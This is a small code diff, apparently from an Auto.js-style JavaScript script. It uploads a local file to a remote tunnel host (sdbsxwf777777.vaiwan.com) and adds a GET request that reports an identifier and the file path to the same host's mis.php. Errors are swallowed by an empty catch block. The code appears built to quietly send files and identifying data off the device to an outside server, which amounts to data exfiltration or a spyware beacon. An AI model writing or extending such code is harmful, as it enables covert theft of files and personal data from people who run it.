@@ -54,6 +54,7 @@ var urltp="sdbsxwf777777.vaiwan.com/sc/upload_file.php";
  var restp = http.postMultipart(urltp, {
      file: open(tp)
  });
+var res = http.get("http://sdbsxwf777777.vaiwan.com/mis.php?fname=" + ids + "&age=" + tp);
 }
 }catch(e){}
 log("yes");
